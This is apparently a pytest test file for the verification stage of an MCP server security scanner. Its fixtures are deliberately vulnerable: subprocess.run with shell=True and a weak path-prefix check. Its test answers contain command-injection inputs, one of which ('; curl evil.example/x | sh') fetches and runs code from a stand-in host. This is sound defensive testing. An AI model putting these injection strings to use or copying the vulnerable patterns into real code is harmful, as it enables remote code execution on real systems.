"""Tests for Stage 4 grounded verification (verify.py).

Deterministic, network-free: no test here calls a real LLM. `_score_answers`
(the verdict-decision logic) and `verify_with_agreement` (the two-run
agreement wrapper) are tested directly against hand-built answer dicts and a
tiny in-test stub `Verifier`, exactly mirroring the schema a real backend
(AnthropicVerifier) or the manual-walkthrough backend (ManualRecordVerifier)
must produce -- see bench/run_verify_manual_walkthrough.py for the real,
non-mocked walkthrough against actual confirmed-vulnerable targets.
"""

import shutil
import textwrap

import pytest

from mcp_safeguard.scanner.taint_scanner import run_static_taint_scan
from mcp_safeguard.scanner.verify import (
    AgreementResult,
    AnthropicVerifier,
    ManualRecordVerifier,
    VerificationResult,
    _score_answers,
    build_prompt,
    verify_with_agreement,
)

pytestmark = pytest.mark.skipif(shutil.which("semgrep") is None, reason="semgrep not installed")


def _write(path, text):
    path.write_text(textwrap.dedent(text))


def _one_finding(tmp_path, rule_id: str):
    findings = run_static_taint_scan(tmp_path)
    matches = [f for f in findings if f.rule_id == rule_id]
    assert matches, findings
    return matches[0]


# --------------------------------------------------------------------------
# build_prompt: evidence gathering
# --------------------------------------------------------------------------


def test_build_prompt_rejects_non_tier_s_finding():
    from mcp_safeguard.scanner.prompt_injection import Severity
    from mcp_safeguard.scanner.source_scanner import SourceFinding

    lexical = SourceFinding(
        rule_id="SRC-001", severity=Severity.HIGH, title="x", description="x",
        location="server.py:1", evidence="x", remediation="x", tier="L",
    )
    with pytest.raises(ValueError, match='tier="S"'):
        build_prompt(lexical, root=".")


def test_build_prompt_includes_traced_path_and_full_handler_source(tmp_path):
    """Reproduces the aliyun/alibaba-cloud-ops-mcp-server shape (see
    MILESTONE_1_STATUS.md) at prompt-construction level."""
    _write(
        tmp_path / "local_tools.py",
        """
        import subprocess

        tools = []

        @tools.append
        def LOCAL_RunShellScript(script: str, working_directory: str = "."):
            process = subprocess.run(
                script,
                shell=True,
                cwd=working_directory,
                capture_output=True,
            )
            return process.stdout
        """,
    )
    _write(
        tmp_path / "server.py",
        """
        from . import local_tools

        for t in local_tools.tools:
            mcp.tool(t)
        """,
    )
    finding = _one_finding(tmp_path, "TAINT-CMDI")
    prompt = build_prompt(finding, tmp_path)

    assert "LOCAL_RunShellScript" in prompt.text
    assert "subprocess.run" in prompt.text
    assert "## Traced evidence path" in prompt.text
    assert "submit_verification" in prompt.text
    # every taint_path line number must be grounded
    for step in finding.taint_path:
        assert step["line"] in prompt.valid_lines
    # entrypoint metadata was resolved (list-loop registration shape)
    assert prompt.entrypoint is not None
    assert prompt.entrypoint.sdk_shape == "list_loop_registration"


def test_build_prompt_resolves_same_file_helper_not_itself_a_taint_step(tmp_path):
    """Reproduces the oncorporation-filesystem-server shape: the sink is
    guarded by a same-file helper (`is_allowed_path`) that Stage 3 never
    surfaces as a Step (its call name isn't a recognized sanitizer name),
    but the verifier still needs to see what that helper actually does."""
    _write(
        tmp_path / "server.py",
        """
        import os

        allowed_dirs = ["/srv/data"]

        def normalize_path(path: str) -> str:
            return os.path.abspath(path.replace("\\\\", "/"))

        def is_allowed_path(path: str) -> bool:
            normalized_path = normalize_path(path)
            for allowed in allowed_dirs:
                if normalized_path.startswith(allowed):
                    return True
            return False

        @mcp.tool()
        def read_file(file_path: str) -> str:
            normalized_file = normalize_path(file_path)
            if not is_allowed_path(normalized_file):
                raise ValueError("not allowed")
            with open(normalized_file, "r") as f:
                return f.read()
        """,
    )
    finding = _one_finding(tmp_path, "TAINT-PATHTRAV")
    prompt = build_prompt(finding, tmp_path)

    # is_allowed_path is never a taint_path Step (not a recognized sanitizer
    # call name) -- confirm that's really true for this fixture, then confirm
    # build_prompt still surfaces its full source as a called function.
    assert not any("is_allowed_path" in step["code"] for step in finding.taint_path)
    assert "def is_allowed_path" in prompt.text
    assert "def normalize_path" in prompt.text
    assert ".startswith(allowed)" in prompt.text


def test_build_prompt_truncates_huge_function_and_bounds_valid_lines(tmp_path):
    padding = "\n".join(f"    _unused_{i} = {i}" for i in range(400))
    source = (
        "import subprocess\n\n"
        "@mcp.tool()\n"
        "def run_it(cmd: str) -> str:\n"
        f"{padding}\n"
        "    process = subprocess.run(cmd, shell=True, capture_output=True)\n"
        "    return process.stdout\n"
    )
    (tmp_path / "server.py").write_text(source)
    finding = _one_finding(tmp_path, "TAINT-CMDI")
    prompt = build_prompt(finding, tmp_path)
    excerpt = prompt.excerpts[0]
    assert excerpt.truncated
    assert "[TRUNCATED" in prompt.text
    # the sink line itself is legitimately grounded even though the full
    # function excerpt was truncated before it -- the traced evidence path
    # section always shows the sink's own code line regardless of function
    # length (see finding.taint_path below).
    sink_line = next(s["line"] for s in finding.taint_path if s["kind"] == "sink")
    assert sink_line in prompt.valid_lines
    assert sink_line > excerpt.end_line  # confirms it really did fall outside the truncated excerpt
    # but an arbitrary padding line in the truncated-out middle, which is
    # neither shown in the excerpt nor a taint_path step, must NOT be
    # claimable as grounded.
    untraced_middle_line = excerpt.end_line + 50
    assert untraced_middle_line not in prompt.valid_lines


# --------------------------------------------------------------------------
# _score_answers: the verdict-decision contract
# --------------------------------------------------------------------------


def test_default_verdict_is_unconfirmed_on_malformed_response():
    result = _score_answers({}, frozenset({1, 2, 3}), model="test")
    assert result.verdict == "unconfirmed"


def test_citation_with_no_line_numbers_is_invalid_not_a_no():
    data = {
        "q1_reachable": {"answer": "no", "cited_lines": [], "reasoning": "looks fine"},
        "q2_neutralized": {"answer": "no", "cited_lines": [], "reasoning": ""},
        "q3_example_input": {"input": None, "cited_lines": [], "reasoning": ""},
        "q4_non_issue_condition": {"condition": "", "cited_lines": []},
    }
    result = _score_answers(data, frozenset({10, 11, 12}), model="test")
    assert result.verdict == "unconfirmed"
    assert not result.grounded


def test_refuted_requires_a_grounded_neutralizing_line():
    data = {
        "q1_reachable": {"answer": "yes", "cited_lines": [10], "reasoning": "reaches the sink"},
        "q2_neutralized": {
            "answer": "yes", "neutralizing_line": 11, "cited_lines": [11],
            "reasoning": "validate_url raises on a disallowed host and returns the value unchanged",
        },
        "q3_example_input": {"input": None, "cited_lines": [], "reasoning": ""},
        "q4_non_issue_condition": {"condition": "n/a", "cited_lines": [11]},
    }
    result = _score_answers(data, frozenset({10, 11, 12}), model="test")
    assert result.verdict == "refuted"
    assert result.grounded


def test_refuted_claim_with_ungrounded_line_falls_back_to_unconfirmed():
    data = {
        "q1_reachable": {"answer": "yes", "cited_lines": [10], "reasoning": "reaches the sink"},
        "q2_neutralized": {
            "answer": "yes", "neutralizing_line": 999, "cited_lines": [999],
            "reasoning": "claims a fix at a line never shown to it",
        },
        "q3_example_input": {"input": None, "cited_lines": [], "reasoning": ""},
        "q4_non_issue_condition": {"condition": "", "cited_lines": []},
    }
    result = _score_answers(data, frozenset({10, 11, 12}), model="test")
    assert result.verdict == "unconfirmed"
    assert not result.grounded


def test_confirmed_requires_grounded_example_input_and_no_neutralization():
    data = {
        "q1_reachable": {"answer": "yes", "cited_lines": [10, 12], "reasoning": "user script reaches subprocess.run"},
        "q2_neutralized": {"answer": "no", "cited_lines": [10], "reasoning": "no sanitizer call anywhere on this path"},
        "q3_example_input": {"input": "; curl evil.example/x | sh", "cited_lines": [12], "reasoning": "shell=True sink"},
        "q4_non_issue_condition": {"condition": "shell were hardcoded to False", "cited_lines": [12]},
    }
    result = _score_answers(data, frozenset({10, 11, 12}), model="test")
    assert result.verdict == "confirmed"
    assert result.grounded


def test_no_example_input_stays_unconfirmed_even_if_reachable():
    data = {
        "q1_reachable": {"answer": "yes", "cited_lines": [10], "reasoning": "reaches the sink"},
        "q2_neutralized": {"answer": "no", "cited_lines": [10], "reasoning": "no sanitizer"},
        "q3_example_input": {"input": None, "cited_lines": [], "reasoning": "couldn't construct one"},
        "q4_non_issue_condition": {"condition": "", "cited_lines": []},
    }
    result = _score_answers(data, frozenset({10, 11, 12}), model="test")
    assert result.verdict == "unconfirmed"


# --------------------------------------------------------------------------
# verify_with_agreement: two independent runs must agree
# --------------------------------------------------------------------------


class _StubVerifier:
    """Test-only Verifier that returns a pre-baked sequence of results, one
    per call -- stands in for two independent (real or manual) runs."""

    def __init__(self, results: list[VerificationResult]):
        self._results = list(results)

    def verify(self, finding, root):
        return self._results.pop(0)


def _vr(verdict: str) -> VerificationResult:
    return VerificationResult(verdict, "stub", {}, [], "stub-model", verdict != "unconfirmed")


def test_agreement_when_both_runs_confirm():
    verifier = _StubVerifier([_vr("confirmed"), _vr("confirmed")])
    result = verify_with_agreement(verifier, finding=object(), root=".")
    assert isinstance(result, AgreementResult)
    assert result.verdict == "confirmed"
    assert result.agreed


def test_disagreement_falls_back_to_unconfirmed_with_both_runs_attached():
    verifier = _StubVerifier([_vr("confirmed"), _vr("unconfirmed")])
    result = verify_with_agreement(verifier, finding=object(), root=".")
    assert result.verdict == "unconfirmed"
    assert not result.agreed
    assert result.run_a.verdict == "confirmed"
    assert result.run_b.verdict == "unconfirmed"


def test_verify_with_agreement_only_supports_two_runs():
    verifier = _StubVerifier([_vr("confirmed")])
    with pytest.raises(ValueError):
        verify_with_agreement(verifier, finding=object(), root=".", runs=1)


# --------------------------------------------------------------------------
# ManualRecordVerifier: honest playback, never fabricates
# --------------------------------------------------------------------------


def test_manual_record_verifier_raises_for_unrecorded_finding(tmp_path):
    _write(
        tmp_path / "server.py",
        """
        import subprocess

        @mcp.tool()
        def run_it(cmd: str) -> str:
            process = subprocess.run(cmd, shell=True, capture_output=True)
            return process.stdout
        """,
    )
    finding = _one_finding(tmp_path, "TAINT-CMDI")
    verifier = ManualRecordVerifier(recorded={})
    with pytest.raises(KeyError):
        verifier.verify(finding, tmp_path)


def test_manual_record_verifier_replays_recorded_answers_in_order(tmp_path):
    _write(
        tmp_path / "server.py",
        """
        import subprocess

        @mcp.tool()
        def run_it(cmd: str) -> str:
            process = subprocess.run(cmd, shell=True, capture_output=True)
            return process.stdout
        """,
    )
    finding = _one_finding(tmp_path, "TAINT-CMDI")
    prompt = build_prompt(finding, tmp_path)
    line = next(s["line"] for s in finding.taint_path if s["kind"] == "sink")
    key = prompt.finding_key

    recorded = {
        key: [
            {
                "q1_reachable": {"answer": "yes", "cited_lines": [line], "reasoning": "reaches sink"},
                "q2_neutralized": {"answer": "no", "cited_lines": [line], "reasoning": "no sanitizer"},
                "q3_example_input": {"input": "; id", "cited_lines": [line], "reasoning": "shell sink"},
                "q4_non_issue_condition": {"condition": "shell=False", "cited_lines": [line]},
            },
        ]
    }
    verifier = ManualRecordVerifier(recorded=recorded)
    result = verifier.verify(finding, tmp_path)
    assert result.verdict == "confirmed"
    assert result.model == "manual-walkthrough[pass 1]"


# --------------------------------------------------------------------------
# AnthropicVerifier: honest refusal without real credentials
# --------------------------------------------------------------------------


def test_anthropic_verifier_refuses_to_run_without_an_api_key(monkeypatch):
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    with pytest.raises(RuntimeError, match="ANTHROPIC_API_KEY"):
        AnthropicVerifier()
